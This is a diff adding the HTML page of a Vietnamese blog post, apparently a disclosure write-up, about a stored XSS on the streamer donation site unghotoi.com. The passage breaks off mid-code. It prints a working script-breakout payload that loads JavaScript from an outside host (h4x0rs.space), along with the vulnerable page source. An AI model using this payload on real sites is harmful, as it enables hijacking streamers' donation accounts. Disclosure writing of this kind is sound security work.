@@ -309,4 +309,1057 @@
 
 </body>
 
+</html><!DOCTYPE html>
+<html lang=en>
+    <head>
+        <!-- so meta -->
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="HandheldFriendly" content="True">
+        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+        <meta name="description" content="Mở đầuMình nghĩ ở thời điểm này 2021, chắc hẳn đại đa số đều đã quen với thuật ngữ livestream. Livestreamer còn là những người KOLs, có sức ảnh hưởng lớn đến cộ">
+        <meta property="og:type" content="article">
+        <meta property="og:title" content="IDOL STREAMER VS. XSS">
+        <meta property="og:url" content="https://blog.cyberjutsu.io/2021/06/02/IDOL-streamer-vs-XSS/index.html">
+        <meta property="og:site_name" content="&#x2F; home &#x2F; cyberjutsu &#x2F; blog &#x2F;">
+        <meta property="og:description" content="Mở đầuMình nghĩ ở thời điểm này 2021, chắc hẳn đại đa số đều đã quen với thuật ngữ livestream. Livestreamer còn là những người KOLs, có sức ảnh hưởng lớn đến cộ">
+        <meta property="og:locale" content="en_US">
+        <meta property="article:published_time" content="2021-06-01T17:00:01.000Z">
+        <meta property="article:modified_time" content="2021-06-04T02:45:42.143Z">
+        <meta property="article:author" content="CyberJutsu Team">
+        <meta property="article:tag" content="xss">
+        <meta name="twitter:card" content="summary">
+        <meta name="twitter:image" content="https://blog.cyberjutsu.io/images/streamer-vs-xss/banner.png">
+        <meta property="og:image" content="https://blog.cyberjutsu.io/images/streamer-vs-xss/banner.png">
+        <link rel="shortcut icon" href="/images/favicon.ico">
+        <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        <!-- title -->
+        <title>IDOL STREAMER VS. XSS</title>
+        <!-- styles -->
+        <link rel="stylesheet" href="/css/style.css">
+        <!-- persian styles -->
+        <!-- fix bug: by bach' -->
+        <!-- 
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+     -->
+        <!-- rss -->
+        <meta name="generator" content="Hexo 5.2.0">
+    </head>
+    <body class="max-width mx-auto ltr">
+        <div id="header-post">
+            <a id="menu-icon" href="#">
+                <i class="fas fa-bars fa-lg"></i>
+            </a>
+            <a id="menu-icon-tablet" href="#">
+                <i class="fas fa-bars fa-lg"></i>
+            </a>
+            <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;">
+                <i class="fas fa-chevron-up fa-lg"></i>
+            </a>
+            <span id="menu">
+                <span id="nav">
+                    <ul>
+                        <li>
+                            <a href="/">home</a>
+                        </li>
+                        <li>
+                            <a href="/about/">about</a>
+                        </li>
+                        <li>
+                            <a href="/archives/">articles</a>
+                        </li>
+                        <li>
+                            <a target="_blank" rel="noopener" href="https://cyberjutsu.io/publications/">publications</a>
+                        </li>
+                    </ul>
+                </span>
+                <br/>
+                <span id="actions">
+                    <ul>
+                        <li>
+                            <a class="icon" href="/2021/08/09/hoc-an-toan-thong-tin/">
+                                <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
+                            </a>
+                        </li>
+                        <li>
+                            <a class="icon" href="/2021/05/13/HTML-sanitizer-vs-XSS/">
+                                <i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i>
+                            </a>
+                        </li>
+                        <li>
+                            <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');">
+                                <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
+                            </a>
+                        </li>
+                        <li>
+                            <a class="icon" href="#">
+                                <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
+                            </a>
+                        </li>
+                    </ul>
+                    <span id="i-prev" class="info" style="display:none;">Previous post</span>
+                    <span id="i-next" class="info" style="display:none;">Next post</span>
+                    <span id="i-top" class="info" style="display:none;">Back to top</span>
+                    <span id="i-share" class="info" style="display:none;">Share post</span>
+                </span>
+                <br/>
+                <div id="share" style="display: none">
+                    <ul>
+                        <li>
+                            <a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.cyberjutsu.io/2021/06/02/IDOL-streamer-vs-XSS/">
+                                <i class="fab fa-facebook " aria-hidden="true"></i>
+                            </a>
+                        </li>
+                        <li>
+                            <a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.cyberjutsu.io/2021/06/02/IDOL-streamer-vs-XSS/&text=IDOL STREAMER VS. XSS">
+                                <i class="fab fa-twitter " aria-hidden="true"></i>
+                            </a>
+                        </li>
+                        <li>
+                            <a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://blog.cyberjutsu.io/2021/06/02/IDOL-streamer-vs-XSS/&title=IDOL STREAMER VS. XSS">
+                                <i class="fab fa-linkedin " aria-hidden="true"></i>
+                            </a>
+                        </li>
+                        <li>
+                            <a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.cyberjutsu.io/2021/06/02/IDOL-streamer-vs-XSS/&is_video=false&description=IDOL STREAMER VS. XSS">
+                                <i class="fab fa-pinterest " aria-hidden="true"></i>
+                            </a>
+                        </li>
+                        <li>
+                            <a class="icon" href="mailto:?subject=IDOL STREAMER VS. XSS&body=Check out this article: https://blog.cyberjutsu.io/2021/06/02/IDOL-streamer-vs-XSS/">
+                                <i class="fas fa-envelope " aria-hidden="true"></i>
+                            </a>
+                        </li>
+                        <li>
+                            <a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://blog.cyberjutsu.io/2021/06/02/IDOL-streamer-vs-XSS/&title=IDOL STREAMER VS. XSS">
+                                <i class="fab fa-get-pocket " aria-hidden="true"></i>
+                            </a>
+                        </li>
+                        <li>
+                            <a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://blog.cyberjutsu.io/2021/06/02/IDOL-streamer-vs-XSS/&title=IDOL STREAMER VS. XSS">
+                                <i class="fab fa-reddit " aria-hidden="true"></i>
+                            </a>
+                        </li>
+                        <li>
+                            <a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://blog.cyberjutsu.io/2021/06/02/IDOL-streamer-vs-XSS/&title=IDOL STREAMER VS. XSS">
+                                <i class="fab fa-stumbleupon " aria-hidden="true"></i>
+                            </a>
+                        </li>
+                        <li>
+                            <a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://blog.cyberjutsu.io/2021/06/02/IDOL-streamer-vs-XSS/&title=IDOL STREAMER VS. XSS">
+                                <i class="fab fa-digg " aria-hidden="true"></i>
+                            </a>
+                        </li>
+                        <li>
+                            <a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://blog.cyberjutsu.io/2021/06/02/IDOL-streamer-vs-XSS/&name=IDOL STREAMER VS. XSS&description=">
+                                <i class="fab fa-tumblr " aria-hidden="true"></i>
+                            </a>
+                        </li>
+                        <li>
+                            <a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://blog.cyberjutsu.io/2021/06/02/IDOL-streamer-vs-XSS/&t=IDOL STREAMER VS. XSS">
+                                <i class="fab fa-hacker-news " aria-hidden="true"></i>
+                            </a>
+                        </li>
+                    </ul>
+                </div>
+                <div id="toc">
+                    <ol class="toc">
+                        <li class="toc-item toc-level-1">
+                            <a class="toc-link" href="#Mo-dau">
+                                <span class="toc-number">1.</span>
+                                <span class="toc-text">Mở đầu</span>
+                            </a>
+                            <ol class="toc-child">
+                                <li class="toc-item toc-level-2">
+                                    <a class="toc-link" href="#Storyline">
+                                        <span class="toc-number">1.1.</span>
+                                        <span class="toc-text">Storyline</span>
+                                    </a>
+                                </li>
+                                <li class="toc-item toc-level-2">
+                                    <a class="toc-link" href="#XSS-co-bat-buoc-phai-click-vao-thu-gi-khong">
+                                        <span class="toc-number">1.2.</span>
+                                        <span class="toc-text">XSS có bắt buộc phải click vào thứ gì không?</span>
+                                    </a>
+                                </li>
+                                <li class="toc-item toc-level-2">
+                                    <a class="toc-link" href="#Moi-thu-bat-dau-tu-su-to-mo">
+                                        <span class="toc-number">1.3.</span>
+                                        <span class="toc-text">Mọi thứ bắt đầu từ sự tò mò</span>
+                                    </a>
+                                </li>
+                                <li class="toc-item toc-level-2">
+                                    <a class="toc-link" href="#The-bug">
+                                        <span class="toc-number">1.4.</span>
+                                        <span class="toc-text">The bug</span>
+                                    </a>
+                                </li>
+                                <li class="toc-item toc-level-2">
+                                    <a class="toc-link" href="#Bonus">
+                                        <span class="toc-number">1.5.</span>
+                                        <span class="toc-text">Bonus</span>
+                                    </a>
+                                </li>
+                            </ol>
+                        </li>
+                    </ol>
+                </div>
+            </span>
+        </div>
+        <div class="content index py4">
+            <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+                <header>
+                    <h1 class="posttitle" itemprop="name headline">IDOL STREAMER VS. XSS
+    </h1>
+                    <div class="meta">
+                        <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+                            <span itemprop="name">l4w</span>
+                        </span>
+                        >>
+      
+    
+                        <div class="postdate">
+                            <time datetime="2021-06-01T17:00:01.000Z" itemprop="datePublished">2021-06-02</time>
+                        </div>
+                        <div class="article-tag">
+                            <i class="fas fa-tag"></i>
+                            <a class="tag-link-link" href="/tags/xss/" rel="tag">xss</a>
+                        </div>
+                    </div>
+                </header>
+                <div class="content" itemprop="articleBody">
+                    <main>
+                        <div class="c-glitch" style="background-image: url('/images/streamer-vs-xss/banner.png');">
+                            <img src='/images/streamer-vs-xss/banner.png'/>
+                            <div class="c-glitch__img" style="background-image: url('/images/streamer-vs-xss/banner.png');"></div>
+                            <div class="c-glitch__img" style="background-image: url('/images/streamer-vs-xss/banner.png');"></div>
+                            <div class="c-glitch__img" style="background-image: url('/images/streamer-vs-xss/banner.png');"></div>
+                            <div class="c-glitch__img" style="background-image: url('/images/streamer-vs-xss/banner.png');"></div>
+                            <div class="c-glitch__img" style="background-image: url('/images/streamer-vs-xss/banner.png');"></div>
+                        </div>
+                    </main>
+                    <h1 id="Mo-dau">
+                        <a href="#Mo-dau" class="headerlink" title="Mở đầu">Mở đầu</a>
+                    </h1>
+                    <p>
+                        Mình nghĩ ở thời điểm này 2021, chắc hẳn đại đa số đều đã quen với thuật ngữ livestream. Livestreamer còn là những người KOLs, có sức ảnh hưởng lớn đến cộng đồng.<br>Nghề này có một đặc thù là phải có internet, internet chính là cánh cổng cho họ để giao tiếp với khán giả, với những người ủng hộ họ. Vậy liệu những lỗi bảo mật có gây ảnh hưởng gì đến họ không?
+                    </p>
+                    <p>Bài này lỗi sẽ không có gì phức tạp và cao siêu cả, mình chỉ muốn kể một câu chuyện về XSS lên các streamer, vì vốn từ năm 2018 mình có hứa hẹn trên blog rằng sẽ viết về nó rồi. Thôi nay có dịp thì làm luôn.</p>
+                    <p>
+                        Nếu các bạn không biết thì mình có một niềm quan tâm đặc biệt với Client-side attack nói chung, vì nó phức tạp và rất thú vị. Thú vị vì nó thay đổi từng ngày, gắn chặt với sự phát triển và nguyên lý hoạt động của trình duyệt (mình thống kê được thì 1 ngày sẽ có khoảng 400 commits khác nhau vào nhân <a target="_blank" rel="noopener" href="https://github.com/chromium/chromium/commits">Chromium</a>
+                        ). Các features liên tục sinh ra cũng đồng thời mang lại những rủi ro mới.
+                    </p>
+                    <p>Sau này còn có các loại tấn công khác liên quan đến nguyên lý của trình duyệt như: XS-Leaks, Cache, DNS, …</p>
+                    <p>
+                        P/S: Nếu bạn còn mới lạ với XSS thì nên xem video <a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=X6QaMATKGMg">XSS Hacking</a>
+                        để nắm một số khái niệm nhé.
+                    </p>
+                    <h2 id="Storyline">
+                        <a href="#Storyline" class="headerlink" title="Storyline">Storyline</a>
+                    </h2>
+                    <p>
+                        TLDR: Mình đã dùng một lỗi XSS để có thể truy cập vào tài khoản donate của các livestreamer nổi tiếng như: ViruSs, QTV, RIP113, Độ Mixi, … tại trang <code>unghotoi.com</code>
+                        . Điểm đặc biệt là mình đã không cần gửi đường link, email hay bất kì thứ gì trực tiếp đến họ. Vì sao ư? Đọc tiếp phần dưới nhé.
+                    </p>
+                    <p>Disclaimer: Tất nhiên mình đã không dùng nó để trục lợi bất kì thứ gì vì mình cũng không quan tâm đến thu nhập của họ lắm, mấy cái này có khi chính những anh ấy đã từng chia sẻ trên stream rồi. </p>
+                    <p>
+                        Đây là những lá mail mình và bạn <code>admin@unghotoi.com</code>
+                        đã trao đổi vào ngày 16/03/2018:
+                    </p>
+                    <p>
+                        <img src="/images/streamer-vs-xss/report_1.png">
+                        <br>
+                        <img src="/images/streamer-vs-xss/report_2.png">
+                        <br>
+                        <img src="/images/streamer-vs-xss/report_3.png">
+                    </p>
+                    <h2 id="XSS-co-bat-buoc-phai-click-vao-thu-gi-khong">
+                        <a href="#XSS-co-bat-buoc-phai-click-vao-thu-gi-khong" class="headerlink" title="XSS có bắt buộc phải click vào thứ gì không?">XSS có bắt buộc phải click vào thứ gì không?</a>
+                    </h2>
+                    <p>Okay tua một tí về bản chất của XSS, thật sự kẻ tấn công có phải gửi hay dụ dỗ nạn nhân click vào một đường link nào không? </p>
+                    <p>Câu trả lời là: TÙY</p>
+                    <p>Tùy vào hoàn cảnh và nơi xảy ra lỗi. Là một người chuyên gia bảo mật đôi khi bạn phải phân tích kĩ càng ở nhiều góc cạnh để đánh giá đúng rủi ro của từng lỗi. Đấy từng là công việc của mình hồi còn ở Microsoft Security Response Center (MSRC). Từng phân tích và đánh giá của mình sẽ quyết định số tiền bounty tới các bug hunters.</p>
+                    <p>Còn nếu đánh giá sai? Bạn sẽ lập tức bị một anh nào đó tweet và tag thẳng @msftsecresponse vào hỏi lí do, và mình sẽ là người phải phân trần với researcher. Căng thẳng lắm mấy bạn :( Thật ra đánh giá sai mức độ nguy hiểm nó cũng ảnh hưởng đến rủi ro khác nữa chứ không phải chỉ liên quan đến tiền bounty của các hunter.</p>
+                    <h2 id="Moi-thu-bat-dau-tu-su-to-mo">
+                        <a href="#Moi-thu-bat-dau-tu-su-to-mo" class="headerlink" title="Mọi thứ bắt đầu từ sự tò mò">Mọi thứ bắt đầu từ sự tò mò</a>
+                    </h2>
+                    <p>Vào thời điểm 2018 đó, mình thật sự khá bị dính vào những buổi livestream của các idol. Xem cực kì giải trí, và mình cũng đã vài lần bắt chước stream khi chơi game lên facebook. Cảm ơn mọi người, bạn bè tôi, lần cao nhất mà mọi người xem tôi chơi game cùng một lúc ở facebook cá nhân là những 10 người…</p>
+                    <p>Xem rất nhiều nên mình rất hiểu phong trào donate, là khi có những người muốn ủng hộ những nhà sáng tạo nội dung bằng cách nạp tiền vào một bên thứ ba và “bắn” donate cho họ như một lời cảm ơn.</p>
+                    <p>Hình dưới là ví dụ trong một buổi livestream của anh QTV:</p>
+                    <p>
+                        <img src="/images/streamer-vs-xss/unghotoi_2.png">
+                    </p>
+                    <p>Nhưng đến một ngày, mình thật sự tò mò là tại sao những người streamer có thể setup để thông báo hiện trực tiếp câu donate một cách real-time như vậy. Mình nghĩ ngay đến việc có thể là có các API (Application Programming Interface) gì đấy ở phía các trang donate.</p>
+                    <p>
+                        Lân la lên trang <a target="_blank" rel="noopener" href="https://unghotoi.com/">https://unghotoi.com/</a>
+                        và các nguồn trên mạng để tìm hiểu cách thức setup thì mình tìm ra một đoạn video sau đây 
+                    </p>
+                    <iframe width="700" height="315" src="https://www.youtube.com/embed/rIficGqW78k" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+                    <p>–</p>
+                    <p>
+                        Nói nôm na đó là, unghotoi sẽ cung cấp cho các streamer những đường dẫn hình thù tựa như sau:<br>
+                        <code>https://unghotoi.com/alert-donation-skin1/&#123;secret_token &#125;</code>
+                        mà trong đó <code>&#123;secret_token &#125;</code>
+                        sẽ là duy nhất và bí mật đối với mỗi tài khoản.
+                    </p>
+                    <p>
+                        Ví dụ của mình sẽ trông như:<br>
+                        <code>https://unghotoi.com/alert-donation-skin1/tk-foLHaVs....22011750</code>
+                    </p>
+                    <p>
+                        <img src="/images/streamer-vs-xss/obs_2.png">
+                    </p>
+                    <p>Fun fact: các bạn có thấy trang donate có nền xanh lè như cách các chương trình truyền hình quay không? đó là để khi chiếu lên, phông màu xanh sẽ được xóa để hình ảnh streaming không bị che :D </p>
+                    <p>
+                        Việc tiếp theo là chúng ta sẽ nhúng đường dẫn trang web này vào chương trình streaming (ở trong video hướng dẫn và đa số mọi người sử dụng đó là <a target="_blank" rel="noopener" href="https://obsproject.com/">OBS - Open Broadcaster Software</a>
+                        ).
+                    </p>
+                    <p>Vâng! Chương trình streaming cho phép chúng ta làm điều đó, cũng dễ hiểu thôi, để làm cho stream vui nhộn và tương tác hơn họ phải cung cấp những features như vậy. Sự tiện ích và security luôn tỉ lệ nghịch với nhau ;)</p>
+                    <p>
+                        <img src="/images/streamer-vs-xss/obs_1.png">
+                    </p>
+                    <h2 id="The-bug">
+                        <a href="#The-bug" class="headerlink" title="The bug">The bug</a>
+                    </h2>
+                    <p>Wait, câu hỏi lập tức nảy ra trong đầu mình là: “Vậy nếu trang web này bị XSS thì như thế nào?”</p>
+                    <p>Các bạn có thể thấy ở trang donate sẽ luôn hỏi “Tên” và “Lời nhắn” cùng với số tiền muốn donate</p>
+                    <p>
+                        <img src="/images/streamer-vs-xss/unghotoi_3.png">
+                    </p>
+                    <p>
+                        Ngay lập tức mình <code>view-source</code>
+                        HTML của trang link <code>https://unghotoi.com/alert-donation-skin1/tk-foLHaVs....22011750</code>
+                        khi có một thông điệp tới, thì phát hiện ra là THÔNG ĐIỆP KHI DONATE sẽ được truyền vào giữa một hàm tên <code>responsiveVoice.speak(...)</code>
+                        (dòng 9)
+                    </p>
+                    <figure class="highlight html">
+                        <table>
+                            <tr>
+                                <td class="gutter">
+                                    <pre>
+                                        <span class="line">1</span>
+                                        <br>
+                                        <span class="line">2</span>
+                                        <br>
+                                        <span class="line">3</span>
+                                        <br>
+                                        <span class="line">4</span>
+                                        <br>
+                                        <span class="line">5</span>
+                                        <br>
+                                        <span class="line">6</span>
+                                        <br>
+                                        <span class="line">7</span>
+                                        <br>
+                                        <span class="line">8</span>
+                                        <br>
+                                        <span class="line">9</span>
+                                        <br>
+                                        <span class="line">10</span>
+                                        <br>
+                                        <span class="line">11</span>
+                                        <br>
+                                        <span class="line">12</span>
+                                        <br>
+                                        <span class="line">13</span>
+                                        <br>
+                                        <span class="line">14</span>
+                                        <br>
+                                        <span class="line">15</span>
+                                        <br>
+                                        <span class="line">16</span>
+                                        <br>
+                                        <span class="line">17</span>
+                                        <br>
+                                        <span class="line">18</span>
+                                        <br>
+                                        <span class="line">19</span>
+                                        <br>
+                                        <span class="line">20</span>
+                                        <br>
+                                        <span class="line">21</span>
+                                        <br>
+                                        <span class="line">22</span>
+                                        <br>
+                                        <span class="line">23</span>
+                                        <br>
+                                        <span class="line">24</span>
+                                        <br>
+                                    </pre>
+                                </td>
+                                <td class="code">
+                                    <pre>
+                                        <span class="line">...snip...</span>
+                                        <br>
+                                        <span class="line">
+                                            <span class="tag">
+                                                &lt;<span class="name">audio</span>
+                                                <span class="attr">controls</span>
+                                                <span class="attr">autoplay</span>
+                                                <span class="attr">class</span>
+                                                =<span class="string">&quot;hide &quot;</span>
+                                                &gt;
+                                            </span>
+                                        </span>
+                                        <br>
+                                        <span class="line">
+                                            <span class="comment">&lt;!-- &lt;source src=&quot;https://unghotoi.com/data/sound/vui-ve-1/3.mp3 &quot;type=&quot;audio/mpeg &quot;/&gt;--&gt;</span>
+                                        </span>
+                                        <br>
+                                        <span class="line">
+                                            <span class="tag">
+                                                &lt;/<span class="name">audio</span>
+                                                &gt;
+                                            </span>
+                                        </span>
+                                        <br>
+                                        <span class="line">
+                                            <span class="tag">
+                                                &lt;<span class="name">script</span>
+                                                <span class="attr">type</span>
+                                                =<span class="string">&quot;text/javascript &quot;</span>
+                                                &gt;
+                                            </span>
+                                        </span>
+                                        <br>
+                                        <span class="line">
+                                            <span class="javascript">
+                                                <span class="function">
+                                                    <span class="keyword">function</span>
+                                                    <span class="title">sayIt</span>
+                                                    (<span class="params"></span>
+                                                    )
+                                                </span>
+                                                &#123;
+                                            </span>
+                                        </span>
+                                        <br>
+                                        <span class="line">
+                                            <span class="javascript">
+                                                animate(<span class="string">&quot;.demo &quot;</span>
+                                                , <span class="string">&#x27;zoomOut &#x27;</span>
+                                                );
+                                            </span>
+                                        </span>
+                                        <br>
+                                        <span class="line">
+                                            <span class="javascript">
+                                                $(<span class="string">&#x27;#myhidden &#x27;</span>
+                                                ).slideUp(<span class="number">3000</span>
+                                                ).delay(<span class="number">30000</span>
+                                                ).fadeOut(<span class="number">3000</span>
+                                                );
+                                            </span>
+                                        </span>
+                                        <br>
+                                        <span class="line">
+                                            <span class="javascript">
+                                                responsiveVoice.speak(<span class="string">&#x27;&#123;LỜI NHẮN KHI DONATE SẼ ĐƯỢC TRUYỀN VÀO ĐÂY &#125;&#x27;</span>
+                                                ,<span class="string">&#x27;Vietnamese Male &#x27;</span>
+                                                ,&#123;<span class="attr">pitch</span>
+                                                : <span class="number">1</span>
+                                                , <span class="attr">rate</span>
+                                                : <span class="number">0.7</span>
+                                                &#125;);
+                                            </span>
+                                        </span>
+                                        <br>
+                                        <span class="line">&#125;</span>
+                                        <br>
+                                        <span class="line">
+                                            <span class="javascript">
+                                                <span class="built_in">setTimeout</span>
+                                                (sayIt, <span class="number">30000</span>
+                                                );
+                                            </span>
+                                        </span>
+                                        <br>
+                                        <span class="line">
+                                            <span class="tag">
+                                                &lt;/<span class="name">script</span>
+                                                &gt;
+                                            </span>
+                                        </span>
+                                        <br>
+                                        <span class="line">
+                                            <span class="tag">
+                                                &lt;<span class="name">script</span>
+                                                <span class="attr">src</span>
+                                                =<span class="string">&#x27;//vws.responsivevoice.com/v/e?key=AFXxO7dn &#x27;</span>
+                                                &gt;
+                                            </span>
+                                            <span class="tag">
+                                                &lt;/<span class="name">script</span>
+                                                &gt;
+                                            </span>
+                                        </span>
+                                        <br>
+                                        <span class="line">
+                                            <span class="tag">
+                                                &lt;<span class="name">script</span>
+                                                <span class="attr">language</span>
+                                                =<span class="string">&quot;javascript &quot;</span>
+                                                &gt;
+                                            </span>
+                                        </span>
+                                        <br>
+                                        <span class="line"></span>
+                                        <br>
+                                        <span class="line">
+                                            <span class="javascript">
+                                                <span class="function">
+                                                    <span class="keyword">function</span>
+                                                    <span class="title">animate</span>
+                                                    (<span class="params">element_ID, animation</span>
+                                                    ) 
+                                                </span>
+                                                &#123;
+                                            </span>
+                                        </span>
+                                        <br>
+                                        <span class="line">
+                                            <span class="javascript">$(element_ID).addClass(animation);</span>
+                                        </span>
+                                        <br>
+                                        <span class="line">
+                                            <span class="javascript">
+                                                <span class="keyword">var</span>
+                                                wait = <span class="built_in">window</span>
+                                                .setTimeout( 
+                                                <span class="function">
+                                                    <span class="keyword">function</span>
+                                                    (<span class="params"></span>
+                                                    )
+                                                </span>
+                                                &#123;
+                                            </span>
+                                        </span>
+                                        <br>
+                                        <span class="line">
+                                            <span class="javascript">
+                                                $(element_ID).removeClass(animation)&#125;, <span class="number">3000</span>
+                                            </span>
+                                        </span>
+                                        <br>
+                                        <span class="line">);</span>
+                                        <br>
+                                        <span class="line">&#125;</span>
+                                        <br>
+                                        <span class="line">
+                                            <span class="tag">
+                                                &lt;/<span class="name">script</span>
+                                                &gt;
+                                            </span>
+                                        </span>
+                                        <br>
+                                        <span class="line">
+                                            <span class="tag">
+                                                &lt;/<span class="name">body</span>
+                                                &gt;
+                                            </span>
+                                        </span>
+                                        <br>
+                                        <span class="line">
+                                            <span class="tag">
+                                                &lt;/<span class="name">html</span>
+                                                &gt;
+                                            </span>
+                                        </span>
+                                        <br>
+                                    </pre>
+                                </td>
+                            </tr>
+                        </table>
+                    </figure>
+                    <p>Nhìn sơ mình đoán chắc hẵn đoạn script này được dùng để đọc lời nhắn donate của những người ủng hộ lên như các bạn thường nghe thấy. </p>
+                    <p>Vậy nếu ra sao mình chèn một XSS payload vào tại đây? </p>
+                    <p>
+                        Không có bất kì bộ lọc hoặc bất kì cách nào để chống XSS tại chỗ này. Dẫn đến mình đã chèn thành công <code>&lt;/script &gt;&lt;script src=&#39;https://h4x0rs.space/a.js &#39;&gt;&lt;/script &gt;</code>
+                    </p>
+                    <p>
+                        <img src="/images/streamer-vs-xss/unghotoi_4.png">
+                    </p>
+                    <figure class="highlight html">
+                        <table>
+                            <tr>
+                                <td class="gutter">
+                                    <pre>
+                                        <span class="line">1</span>
+                                        <br>
+                                        <span class="line">2</span>
+                                        <br>
+                                        <span class="line">3</span>
+                                        <br>
+                                        <span class="line">4</span>
+                                        <br>
+                                        <span class="line">5</span>
+                                        <br>
+                                        <span class="line">6</span>
+                                        <br>
+                                        <span class="line">7</span>
+                                        <br>
+                                        <span class="line">8</span>
+                                        <br>
+                                        <span class="line">9</span>
+                                        <br>
+                                        <span class="line">10</span>
+                                        <br>
+                                        <span class="line">11</span>
+                                        <br>
+                                        <span class="line">12</span>
+                                        <br>
+                                        <span class="line">13</span>
+                                        <br>
+                                        <span class="line">14</span>
+                                        <br>
+                                        <span class="line">15</span>
+                                        <br>
+                                        <span class="line">16</span>
+                                        <br>
+                                        <span class="line">17</span>
+                                        <br>
+                                        <span class="line">18</span>
+                                        <br>
+                                        <span class="line">19</span>
+                                        <br>
+                                        <span class="line">20</span>
+                                        <br>
+                                        <span class="line">21</span>
+                                        <br>
+                                        <span class="line">22</span>
+                                        <br>
+                                        <span class="line">23</span>
+                                        <br>
+                                        <span class="line">24</span>
+                                        <br>
+                                    </pre>
+                                </td>
+                                <td class="code">
+                                    <pre>
+                                        <span class="line">...snip...</span>
+                                        <br>
+                                        <span class="line">
+                                            <span class="tag">
+                                                &lt;<span class="name">audio</span>
+                                                <span class="attr">controls</span>
+                                                <span class="attr">autoplay</span>
+                                                <span class="attr">class</span>
+                                                =<span class="string">&quot;hide &quot;</span>
+                                                &gt;
+                                            </span>
+                                        </span>
+                                        <br>
+                                        <span class="line">
+                                            <span class="comment">&lt;!-- &lt;source src=&quot;https://unghotoi.com/data/sound/vui-ve-1/3.mp3 &quot;type=&quot;audio/mpeg &quot;/&gt;--&gt;</span>
+                                        </span>
+                                        <br>
+                                        <span class="line">
+                                            <span class="tag">
+                                                &lt;/<span class="name">audio</span>
+                                                &gt;
+                                            </span>
+                                        </span>
+                                        <br>
+                                        <span class="line">
+                                            <span class="tag">
+                                                &lt;<span class="name">script</span>
+                                                <span class="attr">type</span>
+                                                =<span class="string">&quot;text/javascript &quot;</span>
+                                                &gt;
+                                            </span>
+                                        </span>
+                                        <br>
+                                        <span class="line">
+                                            <span class="javascript">
+                                                <span class="function">
+                                                    <span class="keyword">function</span>
+                                                    <span class="title">sayIt</span>
+                                                    (<span class="params"></span>
+                                                    )
+                                                </span>
+                                                &#123;
+                                            </span>
+                                        </span>
+                                        <br>
+                                        <span class="line">
+                                            <span class="javascript">
+                                                animate(<span class="string">&quot;.demo &quot;</span>
+                                                , <span class="string">&#x27;zoomOut &#x27;</span>
+                                                );
+                                            </span>
+                                        </span>
+                                        <br>
+                                        <span class="line">
+                                            <span class="javascript">
+                                                $(<span class="string">&#x27;#myhidden &#x27;</span>
+                                                ).slideUp(<span class="number">3000</span>
+                                                ).delay(<span class="number">30000</span>
+                                                ).fadeOut(<span class="number">3000</span>
+                                                );
+                                            </span>
+                                        </span>
+                                        <br>
+                                        <span class="line">
+                                            responsiveVoice.speak(&#x27;chúc idol vui vẻ quẩy lên bây ơi 
+                                            <span class="tag">
+                                                &lt;/<span class="name">script</span>
+                                                &gt;
+                                            </span>
+                                            <span class="tag">
+                                                &lt;<span class="name">script</span>
+                                                <span class="attr">src</span>
+                                                =<span class="string">&#x27;https://h4x0rs.space/a.js &#x27;</span>
+                                                &gt;
+                                            </span>
+                                            <span class="tag">
+                                                &lt;/<span class="name">script</span>
+                                                &gt;
+                                            </span>
+                                            &#x27;,&#x27;Vietnamese Male &#x27;,&#123;pitch: 1, rate: 0.7 &#125;);
+                                        </span>
+                                        <br>
+                                        <span class="line">&#125;</span>
+                                        <br>
+                                        <span class="line">setTimeout(sayIt, 30000);</span>
+                                        <br>
+                                        <span class="line">
+                                            <span class="tag">
+                                                &lt;/<span class="name">script</span>
+                                                &gt;
+                                            </span>
+                                        </span>
+                                        <br>
+                                        <span class="line">
+                                            <span class="tag">
+                                                &lt;<span class="name">script</span>
+                                                <span class="attr">src</span>
+                                                =<span class="string">&#x27;//vws.responsivevoice.com/v/e?key=AFXxO7dn &#x27;</span>
+                                                &gt;
+                                            </span>
+                                            <span class="tag">
+                                                &lt;/<span class="name">script</span>
+                                                &gt;
+                                            </span>
+                                        </span>
+                                        <br>
+                                        <span class="line">
+                                            <span class="tag">
+                                                &lt;<span class="name">script</span>
+                                                <span class="attr">language</span>
+                                                =<span class="string">&quot;javascript &quot;</span>
+                                                &gt;
+                                            </span>
+                                        </span>
+                                        <br>
+                                        <span class="line"></span>
+                                        <br>
+                                        <span class="line">
+                                            <span class="javascript">
+                                                <span class="function">
+                                                    <span class="keyword">function</span>
+                                                    <span class="title">animate</span>
+                                                    (<span class="params">element_ID, animation</span>
+                                                    ) 
+                                                </span>
+                                                &#123;
+                                            </span>
+                                        </span>
+                                        <br>
